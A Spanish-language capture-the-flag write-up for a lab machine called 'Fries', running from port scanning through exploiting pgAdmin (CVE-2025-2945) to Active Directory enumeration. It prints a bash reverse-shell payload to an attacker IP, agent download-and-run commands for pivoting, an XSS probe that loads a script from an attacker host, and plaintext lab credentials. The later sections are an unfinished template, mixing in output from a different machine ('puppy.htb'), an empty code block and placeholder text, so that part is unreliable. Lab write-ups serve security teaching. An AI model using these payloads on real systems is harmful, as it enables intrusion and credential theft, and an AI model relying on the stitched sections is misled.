
# Fries

<figure><img src="/files/wSsQXIIElhaOnI1hP1ue" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Fries`
* **IP:** `10.129.3.64`
* **Sistema operativo:** `Windows`
* **Dificultad:** `🔴 Difícil`
* **Fecha:** `DD-MM-AAAA`

***

## <mark style="color:purple;">Configuración del host</mark>

La plataforma nos proporciona las credenciales iniciales para esta máquina:

```
d.cooper@fries.htb / D4LE11maan!!
```

## <mark style="color:purple;">Escaneo de puertos</mark>

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.129.3.64
```

```bash
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          nginx 1.18.0 (Ubuntu)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-18 01:56:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
```

Encontramos multitud de puertos abiertos, lo normal en máquinas Windows. Ademas nos encontramos con que la máquina objetivo es un Domain Controller, por la presencia de los puertos 3268 o 389, reservados para DCs.

Destacan los puertos:

* `80 HTTP` - Servicio web  &#x20;
* `445 (SMB)` - Recursos compartidos y enumeración
* `5985 (WinRM)` - Acceso con EvilWinRM con contraseña
* `88 (Kerberos)` - Posible Kerberoasting o AS-REP Roasting

#### /etc/passwd

Añadimos la IP `10.129.3.64` a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
echo "10.129.3.64 fries.htb" | sudo tee -a /etc/hosts
```

#### Escaneo Avanzado

Podemos usar Visual Map con un escaneo en XML para detectar posibles vulnerabilidades o vectores de entrada:

```bash
sudo nmap -v -A 10.129.3.64 -oX scan.xml
```

***

## <mark style="color:purple;">Acceso web</mark>

Al acceder a `fries.htb` parece una web de un restaurante. Navegando no encontramos ninguna funcionalidad relevante, es puramente informativa:

<figure><img src="/files/V3pMMimRQ8dsXNqtNIxK" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Enumeración web</mark>

### Fuzzing de Directorios

No encontramos ningún directorio relevante:

```bash
gobuster dir -u http://fries.htb -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://fries.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 14932]
/menu                 (Status: 200) [Size: 19931]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

No se encuentran datos sensibles directamente accesibles.

### Análisis de vulnerabilidades

```bash
nuclei -u fries.htb
```

Nuclei encuentra un `ldap anonymous login` que lo marca como medium:

<figure><img src="/files/fx2kpqpUYiZ4Ixs6o5Jt" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Enumeración de Subdominios (VHosts)</mark>

#### Comprobación de Content-Length

```bash
curl -s -I http://10.129.3.64 -H "Host: defnotvalid.fries.htb" | grep "Content-Length:"

Content-Length: 154
```

#### Fuzzing con FFUF

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.129.3.64/ -H 'Host: FUZZ.fries.htb' -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.3.64/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.fries.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

code                    [Status: 200, Size: 13593, Words: 1048, Lines: 272, Duration: 63ms]
```

**Encontramos el subdominio:** `code.fries.htb`

Lo añadimos a `/etc/hosts` y accedemos para ver su contenido. Concretamente llegamos a un Gitea:

<figure><img src="/files/0pVgXt2JufEEysJLj5sa" alt=""><figcaption></figcaption></figure>

En /explore no encontramos ningún repositorio, pero vemos 2 usurios: Dale Cooper (el usuario del que tenemos credenciales) y administrator. Vamos a loguearnos con Dale Cooper

```
d.cooper@fries.htb / D4LE11maan!!
```

Encontramos un repositorio de `fries.htb` con el contenido de la web, lo que nos puede servir para saber como funciona y explotarla:

<figure><img src="/files/SAo6n9GnxCJx8FX2WyL7" alt=""><figcaption></figcaption></figure>

La aplicación es un **servicio web basado en Python Flask**, respaldado por una **base de datos PostgreSQL**. Cuenta con las siguientes características:

* Una **página de inicio** con información destacada de la empresa.
* Una **sección “Acerca de”** que muestra al fundador y al personal.
* Una **sección de menú** que lista elementos categorizados (comidas, bebidas y acompañamientos).
* **Integración completa con un backend PostgreSQL** para la gestión del menú y los datos de usuarios.
* **Despliegue en contenedores** utilizando **Docker y Docker Compose**.

En el readme encontramos la ruta de la base de datos: <http://db-mgmt05.fries.htb> pero dice que requiere acceso de infra.

#### Descarga del repositorio

```bash
git clone http://code.fries.htb/fries/fries-app.git
cd fries-app
```

#### Analizar Git Log

Siempre que nos descarguemos un repositorio deberíamos examinar el log de git, ya que puede contener credenciales en plano:

```bash
git log -p --all | grep -i "postgresql\|postgres\|database_url\|sqlalchemy" -B 5 -A 5

<SNIP>
 ## 🧰 Tech Stack
--
deleted file mode 100644
index 3fd9e1c..0000000
--- a/.env
+++ /dev/null
@@ -1,2 +0,0 @@
-DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
-SECRET_KEY=y0st528wn1idjk3b9a
diff --git a/.gitignore b/.gitignore
new file mode 100644
index 0000000..7ceb59f
--- /dev/null
<SNIP>
```

Encontramos las credenciales para acceder a la base de datos! Accedemos a <http://db-mgmt05.fries.htb> y nos logueamos:

```
root:PsqLR00tpaSS11
```

Al probar esas credenciales no funcionan (aunque las guardaremos para más tarde por si sirven en otro servicio), por lo que nos logueamos con la cuenta de `d.cooper`. Observamos que la web donde se aloja la base de datos es un `pgAdmin`:

<figure><img src="/files/jXuJZGWKHIkGvZgTGPc0" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Explotación de pgAdmin</mark>

Observamos que es la versión 9.1 de pgAdmin:

<figure><img src="/files/Bi83zX8H54qjLUCR00SZ" alt=""><figcaption></figcaption></figure>

Buscando exploits públicos vemos que es vulnerable a Authenticated RCE con el CVE-2025-2945. Usaremos el siguiente exploit de GitHub:

{% embed url="<https://github.com/Cycloctane/cve-2025-2945-poc>" %}

```bash
python3 exp.py \
  --target-url http://db-mgmt05.fries.htb \
  --username d.cooper@fries.htb \
  --password 'D4LE11maan!!' \
  --db-user root \
  --db-pass 'PsqLR00tpaSS11' \
  --db-name ps_db \
  --payload "__import__('os').system('bash -c \"bash -i >& /dev/tcp/10.10.15.134/4444 0>&1\"')"
```

Abrimos un listener por el puerto 4444 (yo usaré Penelope en vez de Netcat para controlar mejor la sesión) y ejecutamos el exploit:

<figure><img src="/files/2o2VbRQAFXoR5KkgIt3h" alt=""><figcaption></figcaption></figure>

Estamos dentro!

#### IP Interna

Observamos que estamos en una subred interna: `172.18.0.4`

```bash
cb46692a4590:/pgadmin4$ ifconfig

eth0      Link encap:Ethernet  HWaddr BE:3B:DA:26:F7:C6  
          inet addr:172.18.0.4  Bcast:172.18.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:944 errors:0 dropped:0 overruns:0 frame:0
          TX packets:758 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:113735 (111.0 KiB)  TX bytes:5295296 (5.0 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:24 errors:0 dropped:0 overruns:0 frame:0
          TX packets:24 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1464 (1.4 KiB)  TX bytes:1464 (1.4 KiB)
```

Con `ip route` observamos que tiene una ruta hacia la IP `172.18.0.1`:

```bash
cb46692a4590:/tmp$ ip route

default via 172.18.0.1 dev eth0 
172.18.0.0/16 dev eth0 scope link  src 172.18.0.4 
```

## <mark style="color:purple;">Post Explotación - Docker Container</mark>

### Pivoting con Ligolo-ng <a href="#c385" id="c385"></a>

Usaremos Ligolo-ng para acceder a la red interna de Docker y pivotar más:

```bash
# Descargar Ligolo-ng
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz 
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

# Extraer 
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz 
tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

# Crear interfaz TUN 
sudo ip tuntap add user $(whoami) mode tun ligolo 
sudo ip link set ligolo up

# Iniciar proxy 
./proxy -selfcert -laddr 0.0.0.0:11601
```

<figure><img src="/files/rWc8mcqZh6TchXJGxmeY" alt=""><figcaption></figcaption></figure>

#### En el contenedor comprometido

```bash
# Servir al agente desde la máquina atacante 
python3 -m http.server 80
```

```bash
# Descargue y ejecute el agente en el contenedor 
wget http://$ATTACKER_IP/agent
chmod +x agent
./agent -connect $ATTACKER_IP:11601 -ignore-cert
```

```bash
cb46692a4590:/tmp$ ./agent -connect 10.10.15.134:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.15.134:11601"
```

#### Agregar ruta

```bash
# Ruta de red Docker
sudo ip route add 172.18.0.0/24 dev ligolo
```

#### Linpeas

Desde la shell Penelope pulsamos F12 para llevar la sesión al background, y corremos linpeas con el comando run `peass_ng`:

```bash
╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py                                                                                     
CORRUPTED_DB_BACKUP_FILE=
HOME=/home/pgadmin
HOSTNAME=cb46692a4590
OAUTHLIB_INSECURE_TRANSPORT=1
OLDPWD=/pgadmin4
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
PGAPPNAME=pgAdmin 4 - CONN:939253
PWD=/pgadmin4
PWD=/tmp
```

Encontramos una contraseña de admin:

```
admin@fries.htb / Friesf00Ds2025!!
```

Observamos también que podemos escribir en `/etc/passwd` (contenedor Docker) y **se monta en NFS:**

<figure><img src="/files/Xb9o2yfpe3tBTAwLhXgb" alt=""><figcaption></figcaption></figure>

### Montar NFS

Como tenemos el pivoting activo con `Ligolo-ng`, ejecutaremos los siguientes comandos:

```
// Some code
```

***

## <mark style="color:purple;">Enumeración de AD</mark>

```bash
enum4linux-ng -A -u 'admin@fries.htb' -p 'Friesf00Ds2025!!' fries.htb
```

***

## <mark style="color:purple;">Enumeración de Active Directory</mark>

### Extracción de información LDAP

```bash
ldapsearch -x -H ldap://puppy.htb -D "levi.james@PUPPY.HTB" -w 'KingofAkron2025!' -b "dc=puppy,dc=htb" > ldapsearch.txt

cat ldapsearch.txt
```

### Enumeración de usuarios/grupos

```bash
crackmapexec smb fries.htb -u d.cooper@fries.htb -p 'D4LE11maan!!' --users

SMB         puppy.htb       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         puppy.htb       445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         puppy.htb       445    DC               [+] Enumerated domain user(s)
SMB         puppy.htb       445    DC               PUPPY.HTB\steph.cooper_adm               badpwdcount: 0 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\steph.cooper                   badpwdcount: 0 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\jamie.williams                 badpwdcount: 2 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\adam.silver                    badpwdcount: 11 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\ant.edwards                    badpwdcount: 0 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\levi.james                     badpwdcount: 0 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         puppy.htb       445    DC               PUPPY.HTB\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         puppy.htb       445    DC               PUPPY.HTB\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

Añadimos los usuarios encontramos a un archivo `valid-users.txt`. Probar a volcar tickets Kerberos mediante ASREP-Roasting falla:

```
impacket-GetNPUsers puppy.htb/ -usersfile valid-users.txt -dc-ip 10.10.11.70

Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[-] User steph.cooper doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jamie.williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ant.edwards doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User levi.james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### Shares - Recursos compartidos

```bash
crackmapexec smb fries.htb -u admin@fries.htb -p 'Friesf00Ds2025!!' --shares

SMB         fries.htb       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:False)
SMB         fries.htb       445    DC01             [-] fries.htb\admin@fries.htb:Friesf00Ds2025!! STATUS_LOGON_FAILURE 
```

No tenemos acceso.

***

## <mark style="color:purple;">Enumeración con Bloodhound</mark>

### Editar resolv.conf

<pre class="language-bash"><code class="lang-bash">sudo gedit /etc/resolv.conf
<strong>
</strong><strong>domain fries.htb
</strong>nameserver 10.129.3.64
search fries.htb
</code></pre>

### Bloodhound Python

```bash
bloodhound-python -u d.cooper@fries.htb -p 'D4LE11maan!!' -k -ns 10.129.3.64 -c All -d fries.htb --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 10S
INFO: Compressing output into 20250521152019_bloodhound.zip
```

### Análisis con Bloodhound

Mostrar proceso de análisis

***

## <mark style="color:purple;">Explotación</mark>

### Prueba de XSS (si hay forms)

Probaremos el siguiente script en los campos del formulario para ver si es vulnerable a Cross Site Scipting (XSS):

```javascript
 "><script src=http://10.10.14.15:9000/TESTING_THIS</script>
```

Cambiamos la IP por la nuestra y iniciamos un listener con `Netcat` en el puerto 9000. Hacemos clic en el botón `Send` y comprobamos si el listener recibe una llamada para confirmar la vulnerabilidad.

```shell-session
afsh4ck@kali$ nc -lvnp 9000
```

### Investigación de CVEs / Exploits

Exploramos CVEs relacionados con Grafana 11.0.0 en fuentes como:

* <https://sploitus.com>
* <https://exploit-db.com>
* <https://github.com>

**Exploit seleccionado:** *(Describir qué exploit se usó y su URL de referencia)*

### Ejecución del Exploit

Describir paso a paso cómo se logró la ejecución remota o el primer acceso.

***

## <mark style="color:purple;">User Flag</mark>

Ubicación y obtención de la flag del usuario:

```bash
type C:\Users\[usuario]\Desktop\user.txt
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración básica

```
whoami /priv && systeminfo && net user [usuario]
```

### Herramientas automatizadas

```
WinPEAS, Seatbelt
```

#### Técnicas comunes

* **Token impersonation**
* **Abuso de servicios Windows**
* **Credenciales en claro**

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
type C:\Users\Administrator\Desktop\root.txt
```
